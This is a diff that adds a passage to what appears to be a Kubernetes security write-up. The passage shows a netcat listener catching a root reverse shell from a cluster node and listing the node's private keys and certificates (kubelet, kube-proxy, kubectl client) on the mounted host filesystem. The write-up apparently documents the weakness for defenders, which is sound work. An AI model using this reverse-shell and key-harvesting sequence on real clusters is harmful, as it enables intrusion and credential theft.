@@ -234,6 +234,30 @@ $ kubectl --insecure-skip-tls-verify=true  \
 
 While not technically RCE on the node, a remote containerized shell with access to the filesystem will in many cases lead to RCE.
 
+Access to the host filesystem could also be used to read private keys used to communicate with other Kubernetes components:
+
+```
+$ nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.4.4.4] from node [10.1.2.3] 34746
+# id
+uid=0(root) gid=0(root) groups=10(wheel)
+# ls -lah /host/etc/pki
+total 32
+drwxr-xr-x    1 root     root         256 May 26  2018 .
+drwxr-xr-x    1 root     root         302 May 26  2018 ..
+-rw-r--r--    1 root     root        2.3K May 26  2018 kube-proxy.crt
+-r--r--r--    1 root     root        3.2K May 26  2018 kube-proxy.key
+-rw-r--r--    1 root     root        2.3K May 26  2018 kubectl-client-cert.crt
+-r--r--r--    1 root     root        3.2K May 26  2018 kubectl-client-cert.key
+-rw-r--r--    1 root     root        2.3K May 26  2018 kubelet.crt
+-r--r--r--    1 root     root        3.2K May 26  2018 kubelet.key
+-rw-r--r--    1 root     root        2.3K May 26  2018 minion.crt
+-r--r--r--    1 root     root        3.2K May 26  2018 minion.key
+drwx------    1 root     root         210 May 26  2018 private
+drwxr-xr-x    1 root     root          14 Oct 23  2017 trust
+```
+
 It should be noted that with the method above, the attacker has no direct control over which node in the cluster he will gain access to as the Kubernetes Scheduler will allocate the pod to a node based on resource usage at that point.
 
 ## Privileges and Privilege Escalation
